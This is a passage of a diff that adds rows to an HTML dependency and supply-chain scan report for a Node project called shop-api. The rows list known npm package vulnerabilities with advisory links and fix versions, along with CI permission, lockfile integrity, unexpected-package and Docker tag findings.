+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in lodash@4.17.15: Command Injection in lodash</summary>
+<p class="meta">GRD-e21d6bab29 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-35jh-r3h4-6jhm" target="_blank">GHSA-35jh-r3h4-6jhm</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; lodash@4.17.15</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-35jh-r3h4-6jhm: Command Injection in lodash</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/lodash]</span> installed lodash@4.17.15 is inside affected range &lt;4.17.21</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.2 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)</li></ul><p><b>Fix info:</b> fixed in: 4.17.21 · introduced via: lodash@4.17.15</p></details></td>
+<td>lodash@4.17.15<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in lodash@4.17.15: Prototype Pollution in lodash</summary>
+<p class="meta">GRD-844e5ccc16 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-p6mc-m468-83gw" target="_blank">GHSA-p6mc-m468-83gw</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; lodash@4.17.15</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-p6mc-m468-83gw: Prototype Pollution in lodash</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/lodash]</span> installed lodash@4.17.15 is inside affected range &gt;=3.7.0 &lt;4.17.19</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.4 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H)</li></ul><p><b>Fix info:</b> fixed in: 4.17.19 · introduced via: lodash@4.17.15</p></details></td>
+<td>lodash@4.17.15<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in lodash@4.17.15: lodash vulnerable to Code Injection via `_.template` imports key names</summary>
+<p class="meta">GRD-ad2936893a · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-r5fr-rjxr-66jc" target="_blank">GHSA-r5fr-rjxr-66jc</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; lodash@4.17.15</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-r5fr-rjxr-66jc: lodash vulnerable to Code Injection via `_.template` imports key names</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/lodash]</span> installed lodash@4.17.15 is inside affected range &gt;=4.0.0 &lt;=4.17.23</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 8.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)</li></ul><p><b>Fix info:</b> fixed in: 4.18.0 · introduced via: lodash@4.17.15</p></details></td>
+<td>lodash@4.17.15<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in minimatch@3.0.4: minimatch ReDoS vulnerability</summary>
+<p class="meta">GRD-c10ccf2b40 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-f8q6-p94x-37v3" target="_blank">GHSA-f8q6-p94x-37v3</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; minimatch@3.0.4</li><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; glob@7.1.6 &rarr; minimatch@3.0.4</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-f8q6-p94x-37v3: minimatch ReDoS vulnerability</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/minimatch]</span> installed minimatch@3.0.4 is inside affected range &lt;3.0.5</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 3.0.5 · introduced via: mocha@8.4.0</p></details></td>
+<td>minimatch@3.0.4<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in minimatch@3.0.4: minimatch ReDoS: nested *() extglobs generate catastrophically backtracking regular expressions</summary>
+<p class="meta">GRD-7a9576dd66 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-23c5-xmqv-rm74" target="_blank">GHSA-23c5-xmqv-rm74</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; minimatch@3.0.4</li><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; glob@7.1.6 &rarr; minimatch@3.0.4</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-23c5-xmqv-rm74: minimatch ReDoS: nested *() extglobs generate catastrophically backtracking regular expressions</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/minimatch]</span> installed minimatch@3.0.4 is inside affected range &lt;3.1.4</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 3.1.4 · introduced via: mocha@8.4.0</p></details></td>
+<td>minimatch@3.0.4<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in minimatch@3.0.4: minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments</summary>
+<p class="meta">GRD-58616691cd · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-7r86-cg39-jmmj" target="_blank">GHSA-7r86-cg39-jmmj</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; minimatch@3.0.4</li><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; glob@7.1.6 &rarr; minimatch@3.0.4</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-7r86-cg39-jmmj: minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/minimatch]</span> installed minimatch@3.0.4 is inside affected range &lt;3.1.3</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 3.1.3 · introduced via: mocha@8.4.0</p></details></td>
+<td>minimatch@3.0.4<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in minimatch@3.0.4: minimatch has a ReDoS via repeated wildcards with non-matching literal in pattern</summary>
+<p class="meta">GRD-1bb0a68bcd · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-3ppc-4f35-3m26" target="_blank">GHSA-3ppc-4f35-3m26</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; minimatch@3.0.4</li><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; glob@7.1.6 &rarr; minimatch@3.0.4</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-3ppc-4f35-3m26: minimatch has a ReDoS via repeated wildcards with non-matching literal in pattern</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/minimatch]</span> installed minimatch@3.0.4 is inside affected range &lt;3.1.3</li></ul><p><b>Fix info:</b> fixed in: 3.1.3 · introduced via: mocha@8.4.0</p></details></td>
+<td>minimatch@3.0.4<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in nanoid@3.1.20: nanoid: Integer Overflow or Wraparound</summary>
+<p class="meta">GRD-89215d2ced · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-xwg4-73v4-xw9w" target="_blank">GHSA-xwg4-73v4-xw9w</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; nanoid@3.1.20</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-xwg4-73v4-xw9w: nanoid: Integer Overflow or Wraparound</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/nanoid]</span> installed nanoid@3.1.20 is inside affected range &lt;3.3.12</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.4 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N)</li></ul><p><b>Fix info:</b> fixed in: 3.3.12 · introduced via: mocha@8.4.0</p></details></td>
+<td>nanoid@3.1.20<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in nanoid@3.1.20: nanoid: custom generators can loop indefinitely when size is zero</summary>
+<p class="meta">GRD-edf2c05b8a · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-2v37-7h3g-55p8" target="_blank">GHSA-2v37-7h3g-55p8</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; nanoid@3.1.20</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-2v37-7h3g-55p8: nanoid: custom generators can loop indefinitely when size is zero</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/nanoid]</span> installed nanoid@3.1.20 is inside affected range &lt;3.3.18</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.9 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 3.3.18 · introduced via: mocha@8.4.0</p></details></td>
+<td>nanoid@3.1.20<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in nanoid@3.1.20: nanoid: non-secure generators can loop indefinitely with negative size</summary>
+<p class="meta">GRD-28e4ff8f49 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-28wg-ghj8-5hjv" target="_blank">GHSA-28wg-ghj8-5hjv</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; nanoid@3.1.20</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-28wg-ghj8-5hjv: nanoid: non-secure generators can loop indefinitely with negative size</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/nanoid]</span> installed nanoid@3.1.20 is inside affected range &lt;3.3.16</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.9 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 3.3.16 · introduced via: mocha@8.4.0</p></details></td>
+<td>nanoid@3.1.20<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in node-fetch@2.6.0: node-fetch forwards secure headers to untrusted sites</summary>
+<p class="meta">GRD-575e3b161a · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-r683-j2x4-v87g" target="_blank">GHSA-r683-j2x4-v87g</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; node-fetch@2.6.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-r683-j2x4-v87g: node-fetch forwards secure headers to untrusted sites</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/node-fetch]</span> installed node-fetch@2.6.0 is inside affected range &lt;2.6.7</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 8.8 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)</li></ul><p><b>Fix info:</b> fixed in: 2.6.7 · introduced via: node-fetch@2.6.0</p></details></td>
+<td>node-fetch@2.6.0<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in path-to-regexp@0.1.7: path-to-regexp contains a ReDoS</summary>
+<p class="meta">GRD-1c5fa4dd94 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-rhx6-c78j-4q9w" target="_blank">GHSA-rhx6-c78j-4q9w</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; path-to-regexp@0.1.7</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-rhx6-c78j-4q9w: path-to-regexp contains a ReDoS</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/path-to-regexp]</span> installed path-to-regexp@0.1.7 is inside affected range &lt;0.1.12</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 0.1.12 · introduced via: express@4.17.1</p></details></td>
+<td>path-to-regexp@0.1.7<br><small>transitive prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in path-to-regexp@0.1.7: path-to-regexp outputs backtracking regular expressions</summary>
+<p class="meta">GRD-e29370793e · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-9wv6-86v2-598j" target="_blank">GHSA-9wv6-86v2-598j</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; path-to-regexp@0.1.7</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-9wv6-86v2-598j: path-to-regexp outputs backtracking regular expressions</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/path-to-regexp]</span> installed path-to-regexp@0.1.7 is inside affected range &lt;0.1.10</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 0.1.10 · introduced via: express@4.17.1</p></details></td>
+<td>path-to-regexp@0.1.7<br><small>transitive prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in path-to-regexp@0.1.7: path-to-regexp vulnerable to Regular Expression Denial of Service via multiple route parameters</summary>
+<p class="meta">GRD-1f7ff0a614 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-37ch-88jc-xwx2" target="_blank">GHSA-37ch-88jc-xwx2</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; path-to-regexp@0.1.7</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-37ch-88jc-xwx2: path-to-regexp vulnerable to Regular Expression Denial of Service via multiple route parameters</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/path-to-regexp]</span> installed path-to-regexp@0.1.7 is inside affected range &lt;0.1.13</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 0.1.13 · introduced via: express@4.17.1</p></details></td>
+<td>path-to-regexp@0.1.7<br><small>transitive prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in qs@6.7.0: qs vulnerable to Prototype Pollution</summary>
+<p class="meta">GRD-c83abdd646 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-hrpp-h998-j3pp" target="_blank">GHSA-hrpp-h998-j3pp</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; qs@6.7.0</li><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; body-parser@1.19.0 &rarr; qs@6.7.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-hrpp-h998-j3pp: qs vulnerable to Prototype Pollution</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/qs]</span> installed qs@6.7.0 is inside affected range &gt;=6.7.0 &lt;6.7.3</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 6.7.3 · introduced via: express@4.17.1</p></details></td>
+<td>qs@6.7.0<br><small>transitive prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in serialize-javascript@5.0.1: Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()</summary>
+<p class="meta">GRD-66c66a37b9 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-5c6j-r48x-rmvq" target="_blank">GHSA-5c6j-r48x-rmvq</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; serialize-javascript@5.0.1</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-5c6j-r48x-rmvq: Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/serialize-javascript]</span> installed serialize-javascript@5.0.1 is inside affected range &lt;=7.0.2</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 8.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)</li></ul><p><b>Fix info:</b> fixed in: 7.0.3 · introduced via: mocha@8.4.0</p></details></td>
+<td>serialize-javascript@5.0.1<br><small>transitive dev</small></td></tr><tr class="f" data-sev="medium" data-cat="cicd">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>cicd</td><td><details><summary>Workflow grants write-all token permissions</summary>
+<p class="meta">GRD-ad6c4933dc · rule CICD-BROAD-PERMISSIONS · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>workflow-line</b> <span class="src">[.github/workflows/ci.yml:9]</span> permissions: write-all</li></ul></details></td>
+<td>—<br><small> </small></td></tr><tr class="f" data-sev="medium" data-cat="integrity">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>integrity</td><td><details><summary>debug-helper-utils@1.0.2 has no integrity hash in the lockfile</summary>
+<p class="meta">GRD-5e99ff3e09 · rule INTEGRITY-MISSING · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; debug-helper-utils@1.0.2</li></ul><p><b>Evidence:</b></p><ul><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/debug-helper-utils]</span> integrity field missing</li></ul></details></td>
+<td>debug-helper-utils@1.0.2<br><small>direct prod</small></td></tr><tr class="f" data-sev="medium" data-cat="integrity">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>integrity</td><td><details><summary>debug-helper-utils@1.0.2 resolved from outside the npm registry (npm.corp-artifacts.net)</summary>
+<p class="meta">GRD-a8cedcd7ed · rule INTEGRITY-UNTRUSTED-SOURCE · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; debug-helper-utils@1.0.2</li></ul><p><b>Evidence:</b></p><ul><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/debug-helper-utils]</span> resolved: https://npm.corp-artifacts.net/debug-helper-utils/-/debug-helper-utils-1.0.2.tgz</li></ul></details></td>
+<td>debug-helper-utils@1.0.2<br><small>direct prod</small></td></tr><tr class="f" data-sev="medium" data-cat="unexpected-dependency">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>unexpected-dependency</td><td><details><summary>New direct dependency: crossenv@6.1.1</summary>
+<p class="meta">GRD-1387eece0e · rule CHANGE-NEW-PACKAGE · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; crossenv@6.1.1</li></ul><p><b>Evidence:</b></p><ul><li><b>sbom-diff</b> <span class="src">[demo/baseline/package-lock.json]</span> crossenv not present in baseline</li><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/crossenv]</span> added crossenv@6.1.1</li><li><b>install-script</b> <span class="src">[lockfile]</span> new package runs install-time scripts</li></ul><p><b>Fix info:</b> introduced via: crossenv@6.1.1</p></details></td>
+<td>crossenv@6.1.1<br><small>direct dev</small></td></tr><tr class="f" data-sev="medium" data-cat="unexpected-dependency">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>unexpected-dependency</td><td><details><summary>New direct dependency: debug-helper-utils@1.0.2</summary>
+<p class="meta">GRD-4b17ae29e8 · rule CHANGE-NEW-PACKAGE · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; debug-helper-utils@1.0.2</li></ul><p><b>Evidence:</b></p><ul><li><b>sbom-diff</b> <span class="src">[demo/baseline/package-lock.json]</span> debug-helper-utils not present in baseline</li><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/debug-helper-utils]</span> added debug-helper-utils@1.0.2</li><li><b>install-script</b> <span class="src">[lockfile]</span> new package runs install-time scripts</li></ul><p><b>Fix info:</b> introduced via: debug-helper-utils@1.0.2</p></details></td>
+<td>debug-helper-utils@1.0.2<br><small>direct prod</small></td></tr><tr class="f" data-sev="medium" data-cat="unexpected-dependency">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>unexpected-dependency</td><td><details><summary>ua-parser-js@0.7.29 is in the lockfile but nothing depends on it</summary>
+<p class="meta">GRD-4932c67577 · rule UNEXPECTED-ORPHAN · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/ua-parser-js]</span> no dependency edge leads to this package</li></ul><p><b>Fix info:</b> remove (npm prune) unless intentionally vendored; check who added it</p></details></td>
+<td>ua-parser-js@0.7.29<br><small>transitive prod</small></td></tr><tr class="f" data-sev="medium" data-cat="untrusted-image">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>untrusted-image</td><td><details><summary>Image &#x27;node&#x27; uses a mutable tag (latest)</summary>
+<p class="meta">GRD-3c26c523d8 · rule IMAGE-MUTABLE-TAG · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>image-reference</b> <span class="src">[Dockerfile:Dockerfile:1]</span> image: node:latest</li></ul><p><b>Fix info:</b> pin to a version tag and digest, e.g. node:&lt;version&gt;@sha256:&lt;digest&gt;</p></details></td>
+<td>node@latest<br><small>direct build</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in express@4.17.1: Express.js Open Redirect in malformed URLs</summary>
+<p class="meta">GRD-0bd24c48d9 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-rv95-896h-c2vc" target="_blank">GHSA-rv95-896h-c2vc</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-rv95-896h-c2vc: Express.js Open Redirect in malformed URLs</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/express]</span> installed express@4.17.1 is inside affected range &lt;4.19.2</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)</li></ul><p><b>Fix info:</b> fixed in: 4.19.2 · introduced via: express@4.17.1</p></details></td>
+<td>express@4.17.1<br><small>direct prod</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in js-yaml@4.0.0: JS-YAML: Quadratic-complexity DoS in merge key handling via repeated aliases</summary>
+<p class="meta">GRD-b003d43ebf · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-h67p-54hq-rp68" target="_blank">GHSA-h67p-54hq-rp68</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; js-yaml@4.0.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-h67p-54hq-rp68: JS-YAML: Quadratic-complexity DoS in merge key handling via repeated aliases</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/js-yaml]</span> installed js-yaml@4.0.0 is inside affected range &gt;=4.0.0 &lt;=4.1.1</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)</li></ul><p><b>Fix info:</b> fixed in: 4.2.0 · introduced via: mocha@8.4.0</p></details></td>
+<td>js-yaml@4.0.0<br><small>transitive dev</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in js-yaml@4.0.0: js-yaml has prototype pollution in merge (&lt;&lt;)</summary>
+<p class="meta">GRD-acfcf230f1 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-mh29-5h37-fv8m" target="_blank">GHSA-mh29-5h37-fv8m</a></p>
